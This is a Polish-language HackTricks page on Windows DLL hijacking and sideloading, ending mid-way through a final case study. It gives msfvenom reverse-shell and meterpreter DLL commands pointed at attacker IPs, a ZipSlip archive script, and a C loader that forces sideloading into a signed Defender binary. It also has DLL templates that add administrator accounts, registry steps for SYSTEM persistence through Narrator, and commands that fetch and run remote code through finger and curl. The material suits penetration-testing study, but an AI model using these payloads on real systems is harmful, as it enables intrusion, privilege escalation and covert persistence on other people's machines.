# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmuszeniu zaufanej aplikacji do załadowania złośliwej DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu, osiągania persistence oraz, rzadziej, eskalacji uprawnień. Pomimo że tutaj skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

Stosuje się kilka metod DLL hijackingu; ich skuteczność zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana oryginalnej DLL na złośliwą, opcjonalnie używając DLL Proxying w celu zachowania funkcjonalności oryginału.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed tą prawidłową, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej DLL, którą aplikacja załaduje, myśląc, że to brakująca wymagana DLL.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwej DLL.
5. **WinSxS DLL Replacement**: Zastąpienie oryginalnej DLL złośliwą w katalogu WinSxS — metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika razem z skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

> [!TIP]
> Dla krok-po-kroku łańcucha, który nakłada HTML staging, AES-CTR configs i .NET implants na DLL sideloading, sprawdź workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znalezienia brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) ze sysinternals i **ustawienie** **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i pokazanie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, zostaw to działające przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, np. "Process Name" "contains" `<exec name>`, uruchom go i zatrzymaj przechwytywanie zdarzeń.

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, najlepszą szansą jest możliwość **zapisania DLL, którą proces z wyższymi uprawnieniami spróbuje załadować** w jednym z miejsc, w których będzie ona wyszukiwana. W związku z tym możemy **zapisać** DLL w **folderze**, w którym dana DLL jest wyszukiwana **przed** folderem z **oryginalną DLL** (dziwny przypadek), albo będziemy mogli **zapisać** w jakimś folderze, gdzie DLL będzie wyszukiwana, a oryginalna DLL nie istnieje w żadnym folderze.

### Kolejność wyszukiwania DLL

W [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć szczegóły dotyczące sposobu ładowania DLL.**

Aplikacje Windows szukają DLL, podążając za zestawem **predefiniowanych ścieżek wyszukiwania**, przestrzegając określonej kolejności. Problem DLL hijackingu pojawia się, gdy szkodliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, tak że zostanie załadowana przed prawidłową DLL. Rozwiązaniem jest zapewnienie, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganych DLL.

Poniżej widzisz **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego została załadowana aplikacja.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu. (_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie ma funkcji zwracającej ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zauważ, że nie obejmuje to ścieżki per-aplikacja określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zwróć uwagę, że **DLL może być załadowana wskazując ścieżkę absolutną zamiast samej nazwy**. W takim przypadku ta DLL będzie **wyszukana tylko w tej ścieżce** (jeśli DLL ma zależności, będą one wyszukiwane tak, jakby ładowano je po nazwie).

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tu opisywał.

### Łączenie zapisu dowolnego pliku z hijackiem brakującego DLL

1. Użyj filtrów ProcMon (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, które proces sprawdza, ale których nie może znaleźć.
2. Jeśli binarka uruchamia się na **schedule/service**, upuszczenie DLL o jednej z tych nazw do **katalogu aplikacji** (pozycja #1 w kolejności wyszukiwania) zostanie załadowane przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` zanim załadował prawdziwą kopię z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym exportem: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll.
4. Jeśli twój prymityw to zapis arbitralny w stylu ZipSlip, przygotuj ZIP, którego wpis ucieka z katalogu rozpakowania, tak aby DLL trafiła do folderu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki/udziału; gdy zadanie zaplanowane ponownie uruchomi proces, załaduje złośliwy DLL i wykona twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób na deterministyczne wpływanie na ścieżkę wyszukiwania DLL nowo tworzonego procesu to ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Dostarczając tutaj katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowany DLL po nazwie (bez ścieżki bezwzględnej i bez użycia safe loading flags), może zostać zmuszony do załadowania złośliwego DLL z tego katalogu.

Kluczowy pomysł
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowe DllPath wskazujące na kontrolowany przez ciebie folder (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy binarka docelowa rozwiązuje DLL po nazwie, loader sprawdzi dostarczone DllPath podczas rozwiązywania, co umożliwia niezawodny sideloading nawet jeśli złośliwy DLL nie znajduje się obok docelowego EXE.

Uwagi/ograniczenia
- To wpływa na tworzony proces potomny; różni się od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować lub wywołać LoadLibrary dla DLL po nazwie (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i twardo zakodowane ścieżki bezwzględne nie mogą być przechwycone. Forwarded exports i SxS mogą zmieniać priorytety.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Technika ta była obserwowana in-the-wild jako mechanizm napędzający multi-stage sideloading chains: początkowy launcher upuszcza pomocniczy DLL, który następnie uruchamia podpisany przez Microsoft, podatny na hijacking binarz z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu stagingowego.


#### Exceptions on dll search order from Windows docs

Pewne wyjątki od standardowej kolejności wyszukiwania DLL są odnotowane w dokumentacji Windows:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub boczny), który **nie posiada dll**.
- Upewnij się, że dostępny jest **zapis** do dowolnego **katalogu**, w którym **będzie wyszukiwany DLL**. To miejsce może być katalogiem pliku wykonywalnego lub katalogiem w obrębie systemowej ścieżki.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie dość dziwne jest znaleźć uprzywilejowany plik wykonywalny pozbawiony dll** i jeszcze **dziwniejsze jest posiadanie uprawnień do zapisu w folderze będącym częścią systemowej ścieżki** (domyślnie nie możesz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz te warunki, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **main goal of the project is bypass UAC**, możesz tam znaleźć **PoC** Dll hijacking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze** wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić imports pliku executable oraz exports dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny poradnik jak **abuse Dll Hijacking to escalate privileges** mając uprawnienia do zapisu w **System Path folder**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia zapisu w którymkolwiek folderze w system PATH.\
Inne przydatne narzędzia automatyczne do wykrywania tej podatności to **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeśli znajdziesz scenariusz podatny na exploit, jedną z najważniejszych rzeczy do jego skutecznego wykorzystania będzie **stworzenie dll, która eksportuje przynajmniej wszystkie funkcje, które wykonywalny plik będzie z niej importował**. Zauważ też, że Dll Hijacking bywa przydatny do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Możesz znaleźć przykład **how to create a valid dll** w tym opracowaniu o dll hijacking ukierunkowanym na wykonanie: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Dodatkowo, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być użyteczne jako **templates** lub do stworzenia **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolna do **wykonania Twojego złośliwego kodu po załadowaniu**, ale także do **udostępniania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do rzeczywistej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać wykonywalny plik i wybrać bibliotekę, którą chcesz proxify i wygenerować proxified dll, lub wskazać Dll i wygenerować proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje własne

Zwróć uwagę, że w wielu przypadkach Dll, który kompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary — jeśli te funkcje nie będą dostępne, **binary nie będzie w stanie ich załadować** i **exploit się nie powiedzie**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL C++ z tworzeniem konta użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna DLL w C z punktem wejścia w wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przewidywalny, specyficzny dla języka lokalizacyjny plik DLL podczas uruchamiania, który może zostać przejęty (DLL Hijack) w celu wykonania dowolnego kodu i utrzymania dostępu.

Kluczowe informacje
- Ścieżka sprawdzania (aktualne wersje): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ścieżka legacy (starsze wersje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalny plik DLL kontrolowany przez atakującego, zostaje on załadowany, a `DllMain(DLL_PROCESS_ATTACH)` zostaje wykonany. Nie są wymagane żadne eksporty.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny plik DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik upuść `hostfxr.dll` do `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zadanie zaplanowane uruchomi się o 9:30 pod kontekstem bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w momencie wykonania zadania, złośliwy DLL uruchamia się w sesji administratora na poziomie medium integrity.
4. Chain standard UAC bypass techniques, aby podnieść uprawnienia z medium integrity do SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads under a trusted, signed process.

Przegląd łańcucha
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalnie podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z jego katalogu.
- wsc.dll: attacker DLL. Jeśli nie są wymagane żadne specyficzne exports, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekaż wymagane exports do genuine library, uruchamiając payload w DllMain.
- Zbuduj minimalny payload w formie DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań eksportu użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która także wykonuje twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS oraz forwarded exports mogą wpływać na priorytety i należy je brać pod uwagę przy wyborze pliku binarnego hosta oraz zestawu eksportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad używając **triady składającej się z trzech plików**, aby zlewać się z legalnym oprogramowaniem, jednocześnie trzymając główny payload zaszyfrowany na dysku:

1. **Signed host EXE** – dostawcy tacy jak AMD, Realtek, czy NVIDIA są nadużywani (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, żeby wyglądał jak binarka Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Malicious loader DLL** – upuszczana obok EXE z oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL zwykle jest binarką MFC zniekształconą przy użyciu frameworka ScatterBrain; jej jedynym zadaniem jest zlokalizować zaszyfrowany blob, odszyfrować go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po zamapowaniu w pamięci odszyfrowanego payloadu, loader usuwa plik TMP, aby zniszczyć dowody śledcze.

Tradecraft notes:

* Zmienianie nazwy podpisanego EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod binarkę Windows, zachowując jednocześnie podpis dostawcy; dlatego naśladuj praktykę Ink Dragon polegającą na upuszczaniu binarek wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ wykonywalny plik pozostaje zaufany, większość mechanizmów allowlistingu wymaga tylko, aby twoja złośliwa DLL znajdowała się obok niego. Skoncentruj się na dostosowaniu loader DLL; podpisany rodzic zwykle może działać bez zmian.
* ShadowPad’s decryptor oczekuje, że blob TMP będzie znajdował się obok loadera i będzie zapisywalny, aby mógł wyzerować plik po zamapowaniu. Zachowaj katalog jako zapisywalny dopóki payload się ładuje; po załadowaniu do pamięci plik TMP można bezpiecznie usunąć dla OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, więc jedynym niestandardowym artefaktem na dysku jest złośliwa DLL obok zaufanego EXE:

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera TCP/79 tekst; `| cmd` wykonuje odpowiedź serwera, pozwalając operatorom rotować drugą fazę po stronie serwera.

- **Built-in download/extract:** Pobierz archiwum z łagodnym rozszerzeniem, rozpakuj je i przygotuj cel sideload oraz DLL w losowym folderze `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego tar w Windows.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetria pokazywała proces utworzony przez CIM, podczas gdy ładuje współlokowaną DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binarkami, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Generuj alert na `forfiles`, gdy `/p`, `/m` i `/c` pojawiają się razem; rzadkie poza skryptami administracyjnymi.


## Studium przypadku: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawne włamanie Lotus Blossom wykorzystało zaufany łańcuch aktualizacji, aby dostarczyć droppera opakowanego NSIS, który przygotował DLL sideload oraz w pełni pamięciowe payloady.

Przebieg operacyjny
